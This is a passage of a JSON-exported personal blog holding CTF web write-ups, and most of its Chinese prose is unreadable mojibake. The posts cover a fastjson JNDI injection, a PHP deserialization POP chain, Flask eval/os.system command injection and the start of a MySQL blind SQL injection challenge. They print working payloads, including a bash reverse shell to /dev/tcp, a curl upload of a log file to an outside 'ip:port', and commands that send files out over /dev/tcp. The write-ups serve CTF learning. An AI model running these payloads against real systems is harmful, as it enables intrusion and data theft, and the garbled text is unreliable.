[{"content":" æ¬¢ è¿ å…‰ ä¸´ !\nå‰å‡ å¤©çªç„¶æƒ³èµ·è‡ªå·±è¿˜æœ‰ä¸ªåšå®¢ï¼Œè™½ç„¶ç»Ÿå…±åªå†™äº†å››ç¯‡ä¸æˆæ–‡çš„writeupè®°å½•ï¼Œä½†å¥½åƒä¹Ÿèƒ½å¤Ÿä½œä¸ºä¸€ä¸ªå¯ä»¥ç¢ç¢å¿µçš„åœ°æ–¹ã€‚äºæ˜¯å­å“§å­å“§å¼€å§‹æ­å»ºã€‚åŸå…ˆç”¨çš„hexoï¼ŒæŒ‘çš„ä¸»é¢˜ä¸æ˜¯å¾ˆå¥½çœ‹ï¼Œæœ€è¿‘é€›ç€é€›ç€å‘ç°hugoçš„stackçœ‹èµ·æ¥å¾ˆèˆ’æœï¼Œç›´æ¥æ‹¿æ¥ç”¨äº†ã€‚å¾ˆä¹…ä¸æ•²ä»£ç ï¼Œæ„Ÿè§‰å®¡è®¡èµ·æ¥å¾ˆå›°éš¾ï¼Œç€æ‰‹è£…ä¿®çš„è·¯åº”è¯¥ä¼šè¢«æˆ‘æ‹–å¾—è€é•¿\u0026hellip;\nä¸»é¢˜ç›´æ¥ä»å°çƒé£é±¼æä¾›çš„ä»“åº“ç…§æ¬,æ—¥åæœ‰æ—¶é—´å†æ…¢æ…¢æ”¹ã€‚\nåŸä¸»é¢˜åŸºç¡€ä¸Šçš„ä¿®æ”¹ ç®€å•é…ç½®æ›´æ”¹ï¼šæ–‡ç« æœ€åæ›´æ–°æ—¶é—´ã€è¯„è®ºç³»ç»Ÿå…³é—­ æ ·å¼å¾®è°ƒ è¿™ä¸ªmodæ–°å¢çš„ä¸€äº›é¡µé¢å†…å®¹æ˜¯å†™æ­»çš„ï¼Œæ‰‹åŠ¨è°ƒæˆæ¨¡æ¿è°ƒç”¨ TODO: : é“¾æ¥é¡µã€å½’æ¡£é¡µæ ·å¼æ›´æ”¹ : æ·»åŠ ä¸€äº›å°åŠ¨ç”» ï¼šæƒ³åˆ°äº†å†è¯´ è®°å½•ä¸€äº›å››å¤„æœåˆ®æ¥çš„æ–‡ç«  è‰ç¨¿ç®¡ç†\nå†™ä½œå·¥å…·\nhugoå»ºç«™ç¬”è®°\nåšå®¢æ—¥åç”¨é€” æ—¥å¸¸WriteUpè®°å½•ã€æŠ€æœ¯å­¦ä¹ ç¬”è®°ç­‰ç­‰ï¼ˆæŠ€æœ¯åšå®¢çœŸéš¾å†™..å¸Œæœ›æ–°å¹´åšæŒä¸€ä¸‹ï¼‰ ç¢ç¢å¿µæ‚è®° æƒ³åˆ°å†è¯´ ","date":"2023-02-10T00:37:33+08:00","image":"https://example.com/2023/new-blog/87c01ec7gy1fsnqqlbdzjj21kw0w07is_hu6b3641bab08a4d9fcd9c17dbfb8d16cd_176708_120x120_fill_q75_box_smart1.jpg","permalink":"https://example.com/2023/new-blog/","title":"é”µé”µï¼åšå®¢æ¬æ–°å®¶ãƒ¾(â‰§â–½â‰¦*)o"},{"content":"å†™åœ¨å‰é¢ å¾ˆé•¿æ—¶é—´æ²¡æ‰“æ¯”èµ›ï¼Œç”Ÿç–äº†å¾ˆå¤šã€‚è“å¸½æ¯çš„å–è¯é¢˜å¾ˆå‹å¥½ï¼Œå¥½ä¹…æ²¡åšå‡ºè¿™ä¹ˆå¤šé¢˜äº†å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œå’Œpyyå…±åŒè¡¨ç¤ºï¼šè™½ç„¶å†™äº†ä¸€å †æ°´é¢˜ï¼Œä½†æ˜¯å†™äº†å¾ˆå¤šé¢˜ï¼\nä¸è¿‡è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹fastjsonçš„jndiæ³¨å…¥æµç¨‹ã€‚æ„Ÿè°¢é«˜è¡¨å“¥çš„æŒ‡å¯¼( â€¢Ì€ Ï‰ â€¢Ì )âœ§\nEz_gadget fastjson 1.2.62\néœ€è¦ï¼š\nå¼€å¯autotype\nå¯¼å…¥xbean-reflect-3.4.jar\nå…¥å£ï¼š\nimage-20220709213554716\råœ¨å¼€å§‹æ³¨å…¥ä¹‹å‰ï¼Œéœ€è¦ç»•è¿‡hashCode()å’Œequals()çš„æ¯”è¾ƒã€‚javaé‡Œï¼ŒStringç±»é‡å†™äº†Objectçš„hashCodeï¼š\nimage-20220709214050723\rç›¸å…³çš„è§£é‡Šå’Œå‚è€ƒèµ„æ–™ç½‘ä¸Šæœ‰å¾ˆå¤šã€‚é€šä¿—æ¥è¯´ï¼Œå› ä¸ºhashCodeè¿”å›çš„æ˜¯ä¸€ä¸ªintï¼Œè€Œä¸”è¿‡ç¨‹æ˜¯å¯¹å­—ç¬¦ä¸²åˆ†ç»„æ‰§è¡ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥è§£å¯†è¿‡ç¨‹åŒæ ·å¯ä»¥è¿›è¡Œæ‹†åˆ†ã€‚åŸç†æ˜¯ä¸­é—´ç›¸é‡æ”»å‡»ã€‚ç½‘ä¸Šæ‰¾äº†ç”Ÿæˆçš„ä»£ç ï¼Œæ‹¿ç»™å®šçš„keyç›´æ¥ç”Ÿæˆå°±å¯ä»¥äº†ã€‚\næ¥ä¸‹æ¥è¦è€ƒè™‘ç»•è¿‡æ­£åˆ™ï¼Œjsonæ˜¯æ”¯æŒunicodeç¼–ç çš„ï¼Œæ‰€ä»¥å¯ä»¥æŠŠå…³é”®çš„å†…å®¹ç”¨unicodeç¼–ç ä»£æ›¿ï¼Œè¿™é‡Œå°±å…¨éƒ¨ç¼–ç æ›¿ä»£äº†ã€‚\næœ€åæ˜¯fastjsonæ³¨å…¥ã€‚æŸ¥çœ‹æºç å¯ä»¥å‘ç°è¿™ä¸ªé¡¹ç›®é‡Œå¯¼å…¥äº†xbean-reflect-3.4.jaråŒ…ï¼Œé‡Œé¢çš„propertyeditor.JndiConverterç±»æœ‰å¯æ§ç‚¹ï¼š\nimage-20220709220927698\rç»å…¸çš„jndiæ³¨å…¥æ¼æ´ç‚¹ï¼Œç°æˆçš„payloadä¹Ÿå¾ˆå¤šï¼Œæ‰¾ä¸€ä¸ªèƒ½ç”¨çš„ï¼š\n{\u0026quot;@type\u0026quot;:\u0026quot;org.apache.xbean.propertyeditor.JndiConverter\u0026quot;,\u0026quot;AsText\u0026quot;:\u0026quot;rmi://127.0.0.1:1099/exploit\u0026quot;}\rè¿™é‡Œæœ¬åœ°ç¯å¢ƒå°±ç›´æ¥å¼¹è®¡ç®—å™¨äº†ã€‚å¼¹shellçš„è¯æŠŠæ‰§è¡Œå‘½ä»¤æ”¹æˆbash -i \u0026gt;\u0026amp; /dev/tcp/xx.xx.xx.xx/1099 0\u0026gt;\u0026amp;1å°±è¡Œäº†ã€‚\nåŒæ ·ä¹Ÿæœ‰ç°æˆçš„å·¥å…·ï¼ˆå½“ç„¶è‡ªå·±æ­rmiä¹Ÿå¯ä»¥ï¼‰\nimage-20220709223610356\rpayloadï¼š\nstr=9P5JBmvCKwa8awgNWjY_gmj\u0026amp;input={\u0026quot;@type\u0026quot;:\u0026quot;\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0078\\u0062\\u0065\\u0061\\u006e\\u002e\\u0070\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0065\\u0064\\u0069\\u0074\\u006f\\u0072\\u002e\\u004a\\u006e\\u0064\\u0069\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\u0026quot;,\u0026quot;AsText\u0026quot;:\u0026quot;\\u0072\\u006d\\u0069\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0031\\u0030\\u0039\\u0039\\u002f\\u007a\\u0062\\u007a\\u0077\\u0074\\u0038\u0026quot;}\rå‚è€ƒé“¾æ¥ ç”ŸæˆHashCodeä¸€è‡´çš„å­—ç¬¦ä¸²\nçº¢é˜Ÿæ­¦å™¨åº“:fastjsonå°äº1.2.68å…¨æ¼æ´RCEåˆ©ç”¨expå¤ç°\nFastjson \u0026lt;=1.2.62 è¿œç¨‹ä»£ç æ‰§è¡Œ-æ¼æ´å¤ç°\næµ…æFastjson1.2.62-1.2.68ååºåˆ—åŒ–æ¼æ´\njndi_tool\nJNDI-Injection-Exploit\nå¦‚ä½•ç»•è¿‡é«˜ç‰ˆæœ¬ JDK çš„é™åˆ¶è¿›è¡Œ JNDI æ³¨å…¥åˆ©ç”¨\næ·±å…¥ç†è§£JNDIæ³¨å…¥ä¸Javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨\nå†™åœ¨æœ€å javaé¢˜æ‰“çš„å¤ªå°‘äº†ï¼ŒåŸºæœ¬ä¸Šçœ‹åˆ°javaå°±æ”¾å¼ƒäº†ï¼Œä½†æ˜¯ä»Šå¤©ä¸€æ­¥ä¸€æ­¥èµ°ä¸‹æ¥æ”¶è·è¿˜æ˜¯è›®å¤§çš„ï¼Œè™½ç„¶JNDIæ³¨å…¥æ¼æ´è¿˜æ˜¯æ²¡æœ‰å¤ªæ˜ç™½ã€‚è¿™ä¸€ç¯‡ç¨å¾®è®°å½•ä¸€ä¸‹æ‰“çš„è¿‡ç¨‹ï¼Œä¹‹åä¼šå¼€å§‹å¤ç°å„ç§JNDIæ³¨å…¥çš„æ´ï¼Œæ…¢æ…¢æŠŠåˆ†æè¡¥ä¸Šã€‚åŒ…æ‹¬å„ç§å·¥å…·çš„ä½¿ç”¨ï¼Œåœ¨åˆ©ç”¨ç‚¹ä¸Šä¹Ÿæœ‰ä¸€å®šåŒºåˆ«ï¼Œè¿™å¯¼è‡´ä»Šå¤©èŠ±äº†å¾ˆå¤šæ—¶é—´è¸©å‘ï¼Œä¹‹åä¸€å¹¶å†™åˆ°æ€»ç»“é‡Œã€‚\nå…ˆå¼€ä¸ªå‘ï¼Œæºœå•¦~\n","date":"2022-07-09T00:00:00Z","permalink":"https://example.com/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/","title":"è“å¸½æ¯2022"},{"content":"å†™åœ¨å‰é¢ DASCTFæ²¡æœ‰å¥½å¥½æ‰“ï¼Œä½œä¸šå¤ªå¤šäº†ä¸€ç›´åœ¨èµ¶ddlã€‚ä½†æ˜¯å¥½åƒç¡®å®ä¸æ˜¯å¾ˆéš¾çš„æ ·å­ï¼Œå†™ä¸å‡ºæ¥æœç„¶è¿˜æ˜¯æˆ‘å¤ªèœäº†\u0026hellip;\nä»¥åŠï¼Œå¸Œæœ›ä»¥åæŠ½ç©ºå¤šåšåšé¢˜å­(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»*)\nezpop å…ˆæ”¾æºç \n\u0026lt;?php\rclass crow\r{\rpublic $v1;\rpublic $v2;\rfunction eval() {\recho new $this-\u0026gt;v1($this-\u0026gt;v2);\r}\rpublic function __invoke()\r{\r$this-\u0026gt;v1-\u0026gt;world();\r}\r}\rclass fin\r{\rpublic $f1;\rpublic function __destruct()\r{\recho $this-\u0026gt;f1 . '114514';\r}\rpublic function run()\r{\r($this-\u0026gt;f1)();\r}\rpublic function __call($a, $b)\r{\recho $this-\u0026gt;f1-\u0026gt;get_flag();\r}\r}\rclass what\r{\rpublic $a;\rpublic function __toString()\r{\r$this-\u0026gt;a-\u0026gt;run();\rreturn 'hello';\r}\r}\rclass mix\r{\rpublic $m1;\rpublic function run()\r{\r($this-\u0026gt;m1)();\r}\rpublic function get_flag()\r{\reval('#' . $this-\u0026gt;m1);\r}\r}\rif (isset($_POST['cmd'])) {\runserialize($_POST['cmd']);\r}\relse{\rhighlight_file(__FILE__);\r}\rå¤ªä¹…æ²¡æœ‰å†™phpçš„ååºåˆ—åŒ–äº†ï¼Œé­”æœ¯æ–¹æ³•æ€ä¹ˆè§¦å‘éƒ½å¿˜å¾—å·®ä¸å¤šäº†ï¼Œæ‰€ä»¥ç¿»å‡ºäº†y4çš„æ€»ç»“åˆè·Ÿç€çœ‹äº†ä¸€éï¼ˆè®°æ€§å·®çœŸçš„å¥½çƒ¦å•Šï¼‰\n__invoke() åœ¨å¯¹è±¡è¢«ä½œä¸ºå‡½æ•°è°ƒç”¨æ—¶è§¦å‘\r__destruct() åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘\r__call() åœ¨è°ƒç”¨æœªçŸ¥æˆ–è€…ä¸å¯è®¿é—®çš„å‡½æ•°æ—¶è§¦å‘\r__toString() åœ¨å¯¹è±¡è¢«ä½œä¸ºå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘(æ¯”å¦‚æ‰“å°å•¦ã€æ‹¼æ¥å•¦..)\ré¦–å…ˆæ³¨æ„åˆ°mixç±»é‡Œé¢çš„get_flagå‡½æ•°é‡Œæœ‰ä¸€ä¸ªevalï¼Œæ‰€ä»¥å…¥å£åº”è¯¥å°±æ˜¯è¿™é‡Œã€‚äºæ˜¯å¯ä»¥åæ¨å‡ºpopé“¾åº”è¯¥æ€ä¹ˆæ„é€ ã€‚\nget_flagé‡Œé¢æœ‰ä¸€ä¸ªevalå‡½æ•°,æ˜æ˜¾æˆ‘ä»¬éœ€è¦åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œå‘½ä»¤æ‰§è¡Œ.ä¸ºäº†æ‘¸åˆ°è¿™ä¸ªeval,éœ€è¦m1å¯æ§,è¿˜è¦æ‰§è¡Œget_flag();åœ¨finé‡Œé¢è°ƒç”¨__callå¯ä»¥ä½¿f1è°ƒç”¨get_flag(),ä¸ºäº†è°ƒç”¨__callï¼Œå¯ä»¥åˆ©ç”¨crowé‡Œçš„__invokeï¼Œä½¿v1è°ƒç”¨æœªçŸ¥å‡½æ•°è€Œè§¦å‘__call;ä¸ºäº†è°ƒç”¨__invoke,åˆéœ€è¦å°†æŸä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°è§¦å‘ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨finçš„runæˆ–è€…mixçš„run;ä¸ºäº†è°ƒç”¨runï¼Œéœ€è¦è¿›åˆ°__toStringé‡Œï¼Œä½†æ˜¯è§¦å‘è¿™ä¸ª__toString()åˆéœ€è¦å°†å¯¹è±¡ä½œä¸ºå­—ç¬¦ä¸²è°ƒç”¨ï¼Œæ‰€ä»¥è‡ªç„¶å°±è¿›å…¥__destructè°ƒç”¨é‡Œé¢çš„å­—ç¬¦ä¸²æ‹¼æ¥ã€‚åˆ†æå®Œä»¥ä¸Šçš„é—®é¢˜ï¼Œå°±å¯ä»¥æ„é€ popé“¾äº†ã€‚\næµç¨‹ä¸»è¦æ˜¯:\rfin::_destruct()\rwhat::__toString()\rfin::run()/mix::run()\rcrow::__invoke()\rfin::__call()\rmix::get_flag()\ræ‰€ä»¥å®šä¹‰å¦‚ä¸‹çš„å˜é‡ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥é‡æ–°æ„é€ ç±»ï¼‰\n$mix = new mix();\r$mix-\u0026gt;m1 = \u0026quot;\\nsystem('whoami');\u0026quot;; // m1æ˜¯éœ€è¦æ‹¼æ¥è¿›evalçš„å‘½ä»¤ã€‚\r$fin3 = new fin();\r$fin3-\u0026gt;f1 = $mix;\r$crow = new crow();\r$crow-\u0026gt;v1 = $fin3;\r//$mix2 = new mix(); //$mix2-\u0026gt;m1 = $crow;\r$fin2 = new fin(); // è¿™é‡Œçš„fin2æ¢æˆä¸Šé¢çš„mix2åŒæ ·å¯ä»¥å®ç°ï¼Œæ•ˆæœä¸€æ ·çš„\r$fin2-\u0026gt;f1 = $crow;\r$what = new what();\r$what-\u0026gt;a = $fin2;\r$fin = new fin();\r$fin-\u0026gt;f1 = $what;\recho serialize($fin);\runserialize(serialize($fin));\rè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹æ˜¯evalé‡Œé¢æ‹¼æ¥äº†æ³¨é‡Šç¬¦å·#ï¼Œä¸ºäº†ç»•è¿‡è¿™ä¸ªæ³¨é‡Šï¼Œå¯ä»¥å†™å…¥\\næ¥ç»•è¿‡ã€‚ä¸è¿‡æœ‰ä¸€ç‚¹æ¯”è¾ƒå‘çš„æ˜¯hackbarä¸èƒ½ä¼ è¿›æ¢è¡Œï¼Œå¥½åƒburpä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥æœ€åé‡‡ç”¨pythonå‘åŒ…æ‰“çš„è¿œç¨‹ã€‚ä»¥åŠåœ¨è¿™é‡Œé‡åˆ°äº†phpå•å¼•å·å’ŒåŒå¼•å·å­—ç¬¦è½¬ä¹‰çš„é—®é¢˜ï¼Œæˆ‘ä¸€å®šæ˜¯æœ€åä¸€ä¸ªçŸ¥é“phpçš„å•å¼•å·å†…å­—ç¬¦ä¸²åªè½¬ä¹‰æ–œæ å’Œå•å¼•å·çš„å­55555\nå¯¹äº†ï¼Œç›®å½•ä¸‹é¢æœ‰å¾ˆå¤šçš„æ–‡ä»¶ï¼Œå…¶å®åªè¦æ‰§è¡Œcat *ï¼Œæˆ–è€…cat `ls` å°±å¯ä»¥äº†ï¼Œä½†æ˜¯å½“æ—¶æ²¡æ³¨æ„ï¼Œè¿˜ä»¥ä¸ºflagæ”¾åœ¨å…¶ä»–çš„ç›®å½•ä¸‹é¢ï¼Œæˆ‘ç¿»éäº†éƒ½æ²¡æ‰¾åˆ°ã€‚è°çŸ¥é“å°±åœ¨å½“å‰ç›®å½•ä¸‹é¢TT ( zyx : éƒ½åˆ°è¿™é‡Œäº†ï¼Œè‚¯å®šä¸ä¼šä¸ºéš¾ä½ çš„å•¦~ : )å¥½å­\ncalc è¿™é“é¢˜å…¶å®å®Œå…¨æ²¡çœ‹..æ˜¯èµ›åç…§ç€wpè¡¥çš„é¢˜ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹ä¸¤ç§è§£æ³•ã€‚éƒ½éå¸¸å¥½ï¼Œå€¼å¾—å­¦ä¹ ã€‚\nå…ˆè´´ä¸Šæºç \n#coding=utf-8\rfrom flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory\rimport random\rfrom urllib import parse\rimport os\rfrom werkzeug.utils import secure_filename\rimport time\rapp=Flask(__name__)\rdef waf(s):\rblacklist = ['import','(',')',' ','_','|',';','\u0026quot;','{','}','\u0026amp;','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']\rflag = True\rfor no in blacklist:\rif no.lower() in s.lower():\rflag= False\rprint(no)\rbreak\rreturn flag\r@app.route(\u0026quot;/\u0026quot;)\rdef index():\r\u0026quot;æ¬¢è¿æ¥åˆ°SUctf2022\u0026quot;\rreturn render_template(\u0026quot;index.html\u0026quot;)\r@app.route(\u0026quot;/calc\u0026quot;,methods=['GET'])\rdef calc():\rip = request.remote_addr\rnum = request.values.get(\u0026quot;num\u0026quot;)\rlog = \u0026quot;echo {0} {1} {2}\u0026gt; ./tmp/log.txt\u0026quot;.format(time.strftime(\u0026quot;%Y%m%d-%H%M%S\u0026quot;,time.localtime()),ip,num)\rif waf(num):\rtry:\rdata = eval(num)\ros.system(log)\rexcept:\rpass\rreturn str(data)\relse:\rreturn \u0026quot;waf!!\u0026quot;\rif __name__ == \u0026quot;__main__\u0026quot;:\rapp.run(host='0.0.0.0',port=5000) è¿™é‡Œä¸»è¦çš„è€ƒç‚¹æ˜¯å¦‚ä½•ç»•è¿‡eval()ä¸os.systemå‘½ä»¤æ‰§è¡Œã€‚å› ä¸ºé»‘åå•é‡Œbanäº†å¾ˆå¤šå¾ˆå¤šä¸œè¥¿ï¼Œå‰©ä¸‹çš„å‡ ä¹æ²¡æœ‰å¤šå°‘ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªä¹ æƒ¯å‘äºŒå¸ˆå‚…å­¦ä¹ ï¼Œåœ¨ç¢°åˆ°å¤§é‡çš„é»‘åå•è¿‡æ»¤çš„æ—¶å€™ï¼Œè€ƒè™‘å®ƒæ²¡æœ‰è¿‡æ»¤çš„ä¸œè¥¿ï¼Œå†å»æ‰¾è§£é¢˜æ€è·¯ï¼‰ï¼Œä½†æ˜¯å‰©ä¸‹çš„ä¸œè¥¿éƒ½å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚è¯´'#','`','\u0026gt;','$',\u0026quot;'\u0026quot;ã€‚\næ‰€ä»¥å…ˆçœ‹çœ‹ç¬¬ä¸€ç§è§£æ³•ã€‚\nè§£æ³•ä¸€ #åœ¨pythoné‡Œæ˜¯æ³¨é‡Šç¬¦ï¼Œåé¢è·Ÿç€çš„å†…å®¹ä¼šè¢«æ³¨é‡Šæ‰ä¸è§£æã€‚æ‰€ä»¥å¦‚æœä¼ å…¥çš„numæ˜¯\n1#123\ré€šè¿‡evalè§£æå‡ºæ¥çš„å†…å®¹å°±åªæ˜¯ä¸ª1\nimage-20220328200628532\rè¿™ä¸€ç‚¹å¾ˆç¥å¥‡ï¼ŒåŸæ¥pythoné‡Œé¢å¥½å¤šå‡½æ•°åœ¨è§£æå­—ç¬¦ä¸²çš„æ—¶å€™ä¼šæŠŠæ³¨é‡Šç¬¦åé¢è·Ÿç€çš„æ³¨é‡Šæ‰ï¼ŒæŸ¥äº†å¾ˆä¹…èµ„æ–™ä¹Ÿæ²¡æœ‰æŸ¥åˆ°ä¸€ä¸ªå®˜æ–¹ç»™çš„è¯´æ³•ï¼ˆå¥½å­æ˜¯æˆ‘èœï¼‰\nä½†æ˜¯å¦‚æœæ˜¯os.systemï¼Œä¼ åˆ°shellé‡Œé¢ä¼šæŠŠ#çœ‹ä½œå­—ç¬¦è€Œéæ³¨é‡Šç¬¦ã€‚æ‰€ä»¥å°è¯•æ‹¼æ¥è¿™ä¸ªecho {0} {1} {2}\u0026gt; ./tmp/log.txtæ¥è®©os.systemæ‰§è¡Œã€‚é¦–å…ˆæ¥çœ‹ä¸€ä¸‹åœ¨bashé‡Œé¢çš„ç»“æœã€‚\nimage-20220328202428403\ræ‰§è¡Œä¹‹åï¼Œæ‰“å¼€log.txtï¼Œå¯ä»¥çœ‹åˆ°åå¼•å·é‡Œé¢çš„å‘½ä»¤è¢«æ‰§è¡Œå¹¶ä¸”å°†ç»“æœè¾“å…¥log.txtäº†\nimage-20220328202502583\ræ‰€ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥è€ƒè™‘ä¼ å…¥ä¸€ä¸ªå¯ä»¥è®©os.systemæ‰§è¡Œçš„å‘½ä»¤ï¼Œå°è¯•å¤–å¸¦å‡ºç»“æœã€‚è¿™é‡Œç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘å…¶ä»–çš„ç©ºç™½ç¬¦ã€‚\nå¯ä»¥å…ˆå†™å…¥å†å¤–å¸¦ã€‚\npayload\nnum = 1%23`ls%09/`%23\rnum = 1%23`curl%09-F%09xx=@tmp/log.txt%09http://ip:port/`%23\räºŒå¸ˆå‚…ç»™çš„payloadæ˜¯ç›´æ¥å¤–å¸¦ã€‚\npayload\nnum = 1%23%60%2Fbin%2Fbash%09-c%09%27cat%09.%2F*%3E%2Fdev%2Ftcp%2Fip%2Fport%27%60%3E\ræœåŠ¡å™¨è¿™å¤´ç›‘å¬ä¸€ä¸‹å°±è¡Œã€‚\nimage-20220329171534234\rimage-20220329160322856\rè§£æ³•äºŒ åˆ©ç”¨pythonçš„ä¸‰å¼•å·æ„é€ å¤šè¡Œå­—ç¬¦ä¸²ï¼Œä¸‰å¼•å·æ‹¬èµ·æ¥çš„å†…å®¹åœ¨evalé‡Œè¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œæ˜¯ä¸ä¼šæŠ¥é”™çš„ã€‚æ¯”å¦‚è¯´ï¼š\nimage-20220329173754460\ræ—¢ç„¶è¿‡äº†evalï¼Œé‚£æ¥ä¸‹æ¥å¼€å§‹è€ƒè™‘æ€ä¹ˆè®©shellæ‰§è¡Œã€‚å…ˆæ¥çœ‹çœ‹shellé‡Œé¢ä¸‰å¼•å·çš„ååº”ã€‚é¦–å…ˆshellæ˜¯æ”¯æŒå¤šè¡Œå­—ç¬¦ä¸²çš„ï¼Œç¬¬ä¸€ç¬¬äºŒä¸ªè¾“å‡ºå¯ä»¥çœ‹å‡ºæ¥ã€‚å¹¶ä¸”shellé‡Œé¢å¯¹å¤šä¸ªå•å¼•å·ï¼Œä¸€èˆ¬æ˜¯é‡‡å–é—­åˆçš„åŠæ³•æ¥è¯†åˆ«ï¼Œçœ‹ç¬¬ä¸‰ä¸ªè¾“å‡ºã€‚å†åŠ ä¸Šshellé‡Œé¢ï¼Œä»¥#å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“ä½œæ³¨é‡Šï¼Œä¸äºˆè¾“å‡ºï¼Œçœ‹ç¬¬å››ä¸ªä¾‹å­ã€‚\nimage-20220329173926144\ræ‰€ä»¥æ ¹æ®evalå’Œshellå¯¹å¾…ä¸‰å¼•å·å­—ç¬¦ä¸²çš„ä¸åŒè§£é‡Šï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹è¾“å…¥ï¼š\n'''1'\\nls\\n#'3'''\ræŠŠè¿™ä¸ªè¾“å…¥æ‹¼æ¥åˆ°echoé‡Œé¢å°±æ˜¯\necho {0} {1} '''1'\rls\r#'3'''\u0026gt; ./tmp/log.txt\ræˆåŠŸå‘½ä»¤æ‰§è¡Œã€‚\nè¿™é‡Œä¸ºäº†æ‹¿åˆ°flagï¼Œå¯ä»¥ç›´æ¥å¤–å¸¦\npayload\nnum = %27%27%271%27%0Acat%0A/*%09%3E%09/dev/tcp/x.x.x.x/port%0A%23%273%27%27%27\rå‚è€ƒèµ„æ–™ DASCTF X SU 2022 writeup\n2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ› WriteUp\n[CTF]PHPååºåˆ—åŒ–æ€»ç»“\nå†™åœ¨åé¢ åˆæ°´äº†ä¸€åœºæ¯”èµ›ï¼Œä¸è¿‡è¿˜æ˜¯å­¦åˆ°ä¸œè¥¿äº†ã€‚ä»¥å‰æ²¡èƒ½æŠŠç›¸åº”çš„çŸ¥è¯†ç‚¹è®°å½•ä¸‹æ¥çœŸçš„æœ‰ä¸€ç‚¹å¯æƒœï¼ˆå¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯ç¬”è®°ä¸¢äº†23333ï¼‰ï¼Œä¸è¿‡å¤§éƒ¨åˆ†çš„äº‹æƒ…ä»€ä¹ˆæ—¶å€™å¼€å§‹éƒ½ä¸ç®—æ™šå§ï¼ˆå¤§æ¦‚ï¼‰ã€‚\nåŠ æ²¹åŠ æ²¹ã€‚\n","date":"2022-03-30T00:00:00Z","permalink":"https://example.com/2022/dasctfxsuctf-web-writeup/","title":"DASCTFxSUCTF-web-writeup"},{"content":"å†™åœ¨å‰é¢ æ‰“è™ç¬¦CTFï¼Œå¼€å¤´å°±è¢«å¹³å°æŒ¡åœ¨å¤–é¢äº†:D\nwebä¸€å¦‚æ—¢å¾€çš„éš¾ï¼Œbabysqlçœ‹èµ·æ¥å¯åšä¸€äº›ï¼Œå°±ä»è¿™é“é¢˜å¼€å§‹ã€‚æ­¤å¤„æ„Ÿè°¢é«˜è¡¨å“¥å’Œnkkçš„æŒ‡å¯¼å’Œpyyçš„è„‘æ´ã€‚\nç–«æƒ…ç‰¹æ®Šæ—¶æœŸï¼Œä¸èƒ½çº¿ä¸‹èšé›†æ‰“æ¯”èµ›è¿˜æ˜¯æœ‰ç‚¹å¯æƒœï¼Œå®éªŒå®¤ä¸‰ä¸ªwebæ‰‹ç»™äºŒå¸ˆå‚…æ‰“ä¸‹æ‰‹(bushi)\nè§£é¢˜è¿‡ç¨‹ image-20220320142246038\rIt is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in /hint.md.\nå‰å°é™åˆ¶äº†è¾“å…¥ï¼Œè¿™ä¸ªä¸è¦ç´§ï¼Œå¯ä»¥é€šè¿‡pythonæˆ–è€…burpå‘åŒ…è¿‡å»ã€‚\nimage-20220320142647728\réšä¾¿è¾“å…¥ç™»å½•ä¸€ä¸‹ã€‚\nç»™äº†ä¸ªè¿”å›å€¼ã€‚å¦‚æœè¦æ³¨å…¥çš„è¯åªèƒ½æ ¹æ®è¿™ä¸ªè¿”å›å€¼åˆ¤æ–­ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä¸ªç›²æ³¨ã€‚\n{\u0026quot;statusCode\u0026quot;:401,\u0026quot;message\u0026quot;:\u0026quot;Unauthorized\u0026quot;}\ræ®é¢˜ç›®æ‰€è¯´èƒ½æ³¨å‡ºè´¦å·å¯†ç å°±ç»™flagã€‚ç„¶åå¾ˆè´´å¿ƒç»™äº†ä¸€ä¸ªhintï¼Œå…ˆè¿›å»çœ‹çœ‹ã€‚\n```sql\rCREATE TABLE `auth` (\r`id` int NOT NULL AUTO_INCREMENT,\r`username` varchar(32) NOT NULL,\r`password` varchar(32) NOT NULL,\rPRIMARY KEY (`id`),\rUNIQUE KEY `auth_username_uindex` (`username`)\r) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;\r```\r```js\rimport { Injectable } from '@nestjs/common';\rimport { ConnectionProvider } from '../database/connection.provider';\rexport class User {\rid: number;\rusername: string;\r}\rfunction safe(str: string): string {\rconst r = str\r.replace(/[\\s,()#;*\\-]/g, '')\r.replace(/^.*(?=union|binary).*$/gi, '')\r.toString();\rreturn r;\r}\r@Injectable()\rexport class AuthService {\rconstructor(private 